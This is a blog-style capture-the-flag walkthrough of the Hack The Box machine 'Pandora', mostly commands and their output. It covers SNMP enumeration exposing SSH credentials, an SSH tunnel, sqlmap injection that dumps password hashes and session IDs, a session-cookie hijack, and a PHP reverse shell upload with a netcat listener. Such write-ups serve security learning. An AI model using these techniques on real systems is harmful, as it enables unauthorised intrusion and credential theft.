---
layout: post
title: CTF Pandora
date:   2022-02-04 18:30:52 -0600
categories: CTF
tags: Linux
---

# /etc/hosts
```
10.10.11.136 pandora.htb
```

# nmap
```sh
nmap -sV -p- 10.10.11.136

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# wfuzz
```sh
wfuzz --sc 200 -w Documents/wordlist/directory-list-2.3-medium.txt http://pandora.htb/FUZZ 
```
Nothing, same for the subdoimains.

# nmap n°2
```sh
sudo nmap -sU --min-rate 100 pandora.htb
```
```sh
PORT      STATE  SERVICE
161/udp   open   snmp
19283/udp closed keysrvr
```
let's see what we can do with snmp

# Matasploit
```sh
msfconsole
use auxiliary/scanner/snmp/snmp_enum
show options 
set rhost 10.10.11.136
```
![](https://i.imgur.com/mcpb6dK.png)
This is so cool, I can see every process, there is lot off hackers in the box.
![](https://i.imgur.com/bOTP7Qe.png)

/usr/bin/host_check -u daniel -p HotelBabylon23

# ssh
```sh
ssh daniel@pandora.htb
```
# lse
![](https://i.imgur.com/IVbKPL4.png)
on My computer in my script directory
```sh
python2.7 -m SimpleHTTPServer
```
on the target
```sh
wget http://10.10.15.22:8000/lse.sh
chmod +x lse.sh
./lse.sh
```
```sh
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/pandora_backup
---
```

# pownkit
![](https://i.imgur.com/Bk4gsvA.png)
```sh
root         960  0.0  0.2 236420  8932 ?        Ssl  10:00   0:00 /usr/lib/policykit-1/polkitd --no-debug
```
![](https://imgflip.com/s/meme/Heavy-Breathing-Cat.jpg)
I have to resist!!!


# pandora_backup
![](https://i.imgur.com/KAQW2JG.png)
I have to pwn matt first.

# linPEAS
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
![](https://i.imgur.com/fLklauz.png)
I'm not supposed to use this exploit... 
I can do it to get the frre flags but it'm not a cheater.

I have other open ports.
![](https://i.imgur.com/lduSgbN.png)

![](https://i.imgur.com/5QHok7i.png)
Interesting files
![](https://i.imgur.com/GYWGrnq.pn)
Mysql user:
![](https://i.imgur.com/ka2uqGD.png)

# mysql

```sh
nmap -sV -p- 127.0.0.1

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.5-10.3.32-MariaDB-0ubuntu0.20.04.1
```
I don't have the creds

# web
I wanted to browse pandora.panda.htb:
![](https://i.imgur.com/sLTVklz.png)
it's in my /etc/hosts but it's not working, so tryed to do it via ssh with curl.
```sh
curl pandora.panda.htb
```
Same problem, let's see his /etc/hosts

```sh
daniel@pandora:/tmp/dir$ cat /etc/hosts
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora
```
127.0.0.1 pandora is the website I saw on the port 80,
I think 127.0.0.1 work only on localhost.
```sh
daniel@pandora:/tmp/dir$ curl pandora.pandora.htb
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```
Yesss!!!!
Now I have to find a way to se in on my browser.
## Web tunneling
 
https://www.it-connect.fr/chapitres/tunneling-ssh/
It's french but it's good!
```sh
ssh -f daniel@pandora.htb -L 2500:localhost:80 -N
```
Boom!

![](https://i.imgur.com/gRdjheN.png)
Where is the password... what is the username...(╯°□°）╯︵ ┻━┻)
![](https://i.imgur.com/FfeEqxp.png)
Oh no I have to be fast. 


# Connnect with daniel
I was trying to connect with daniel.
Ihave this error:
![](https://i.imgur.com/1xNxtp3.png)
It's good, I have to use the API.

# Browsing the files 
In `/var/www/pandora/pandora_console`

```sh
cat pandoradb.sql |grep pass
```
```sql
	`plugin_pass` text,
	`password` varchar(45) default '',
	`password` text,
	`snmp_auth_pass` varchar(255) NOT NULL default '',
	`snmp_privacy_pass` varchar(255) NOT NULL default '',
	`plugin_pass` text,
	`password` varchar(45) default NULL,
	`force_change_pass` tinyint(1) unsigned NOT NULL default 0,
	`last_pass_change` DATETIME  NOT NULL DEFAULT 0,
	`ehorus_user_level_pass` VARCHAR(45),
-- Table `treset_pass_history`
CREATE TABLE IF NOT EXISTS `treset_pass_history` (
-- "pass_opt" are deprecated for the 5.1.
	`pass_opt` varchar(50) default '',
	`pass` varchar(100) NOT NULL default '',
	`is_password_type` tinyint(1) NOT NULL default 0,
-- Table `tpassword_history`
CREATE TABLE IF NOT EXISTS `tpassword_history` (
	`id_pass`  int(10) unsigned NOT NULL auto_increment,
	`password` varchar(45) default NULL,
	PRIMARY KEY  (`id_pass`)
	`plugin_pass` text default '',
	`password` varchar(100) default '',
	`password` varchar(100) default '',
	`dbpass` text,
	`meta_dbpass` text,
	`api_password` text NOT NULL,
CREATE TABLE IF NOT EXISTS `treset_pass` (
```

```sh
cat DB_Dockerfile 
```
```sh
FROM mysql:5.5
MAINTAINER Pandora FMS Team <info@pandorafms.com>

WORKDIR /pandorafms/pandora_console

ADD pandoradb.sql /docker-entrypoint-initdb.d
ADD pandoradb_data.sql /docker-entrypoint-initdb.d
RUN chown mysql /docker-entrypoint-initdb.d

ENV MYSQL_DATABASE=pandora

RUN echo " \n\
sed -i \"1iUSE \$MYSQL_DATABASE\" /docker-entrypoint-initdb.d/pandoradb.sql \n\
sed -i \"1iUSE \$MYSQL_DATABASE\" /docker-entrypoint-initdb.d/pandoradb_data.sql \n\
" >> /docker-entrypoint-initdb.d/create_pandoradb.sh
```
Dbmane="pandora"
Table="tpassword_history" 
This website show where we can exploit.
https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained

# sqlmap
I don't use sqlmap very often, that's why I had lot of trouble.
```sh
sqlmap "http://localhost:2500/pandora_console/include/chart_generator.php" -D pandora

[20:44:13] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--crawl=2'
```
```sh
sqlmap "http://localhost:2500/pandora_console/include/chart_generator.php?id=''" -D pandora --tables

[20:45:33] [WARNING] GET parameter 'id' does not seem to be injectable
```

Now I have to find out what I have to use instead if 'id'.
![](https://i.imgur.com/g5qEfwf.png)

```sh
sqlmap "http://localhost:2500/pandora_console/include/chart_generator.php?session_id=''" -D pandora

[20:47:42] [WARNING] potential permission problems detected ('Access denied')
```
I have an another error, it's good.
This is a cheat sheet:
https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
```sh
sqlmap "http://localhost:2500/pandora_console/include/chart_generator.php?session_id=''"  -D pandora -T tpassword_history --dump

+---------+---------+---------------------+----------------------------------+---------------------+
| id_pass | id_user | date_end            | password                         | date_begin          |
+---------+---------+---------------------+----------------------------------+---------------------+
| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
+---------+---------+---------------------+----------------------------------+---------------------+
```
## list of tables
```sh
sqlmap "http://localhost:2500/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables

[178 tables]
+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+
```
```sh
sqlmap "http://localhost:2500/pandora_console/include/chart_generator.php?session_id=''"  -D pandora -T tsessions_php --dump

+----------------------------+------------------------------------------------------+-------------+
| id_session                 | data                                                 | last_active |
+----------------------------+------------------------------------------------------+-------------+
| 07ou61d2jsi3087a9jg12s3m1k | NULL                                                 | 1644502695  |
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                             | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                 | 1638789018  |
| 1t2n71opaqeoausmhaqk277c21 | id_usuario|s:6:"daniel";                             | 1644502477  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                 | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                 | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                             | 1638540332  |
| 3fq6hl9r8kbadgq6r5bfjmojm5 | NULL                                                 | 1644502325  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                 | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                 | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                             | 1638535373  |
| 59qae699l0971h13qmbpqahlls | NULL                                                 | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                 | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                             | 1638281946  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                             | 1641195617  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                 | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                             | 1638446321  |
| 8uiokruc91od5tphgekpsau4lp | alert_msg|a:0:{}new_chat|b:0;                        | 1644502812  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                 | 1638787267  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                             | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                 | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                             | 1638881664  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                 | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                 | 1638786277  |
| d0h8gpqrh99ur3pfcb53vqak5e | NULL                                                 | 1644513572  |
| elks2rkjdnk8f001jqbkinael0 | NULL                                                 | 1644513405  |
| eqsc2gjr37g0ug1q4qdk3rabh4 | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0; | 1644502437  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                             | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                 | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                 | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                             | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;  | 1644512890  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                 | 1638786349  |
| h1ge39342hcid93s3ghk0nhl3c | NULL                                                 | 1644502501  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                 | 1638540345  |
| hif1pavjlks18e7oqgu8bmvhis | NULL                                                 | 1644513371  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                             | 1638168492  |
| j85l7a3q010b3ul6sv2eh6amo6 | NULL                                                 | 1644502455  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                             | 1638456173  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                 | 1638787808  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                 | 1638796348  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                             | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                             | 1637667827  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                             | 1638168416  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                 | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                 | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                             | 1638889082  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                             | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                             | 1638793297  |
| vntmpokca9aee53q48op3mesqs | id_usuario|s:6:"daniel";                             | 1644502107  |
+----------------------------+------------------------------------------------------+-------------+
```
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; 

You have to past it in the cookie.
![](https://i.imgur.com/K2F071M.png)

Refresh the page..
And now you are matt, you can also take the admin cookie but someone else is playing with it,
so it's not working.

I have to kill them.

![](https://i.imgur.com/O1QDhTv.png)
Oh, sorry ppl, it's not working.
Hummm, it's working because I was logged in as admin, but I removed the cookie.
One of them is logged as admin, he have to finish the box first I think
Someone is using chisel, I have to try this tool too.
I think it's like mu tunnel ssh.
![](https://i.imgur.com/4RtRUMM.png)

https://github.com/jpillora/chisel
Ok I will try later.

# As admin.

Now I'm admin on the machine, I had to wait 2 hours.
![](https://i.imgur.com/8VpKwKC.png)
## Download the revershell
I'v downloaded a reversshell here:
https://github.com/pentestmonkey/php-reverse-shell

```sh
$ip = '10.10.15.27';  // CHANGE THIS
$port = 4648;       // CHANGE THIS
```
## Zip it
```sh
zip -r php-reverse-shell.zip php-reverse-shell.php
```

## netcat
```sh
nc -lvp 4648
```
## Upload it

![](https://i.imgur.com/hc0NHYf.png)

## I'm matt

![](https://i.imgur.com/IxwjjaN.png)

# pandora_backup

I can't be admin on the webpage, it's buggy.
I leave this CTF.







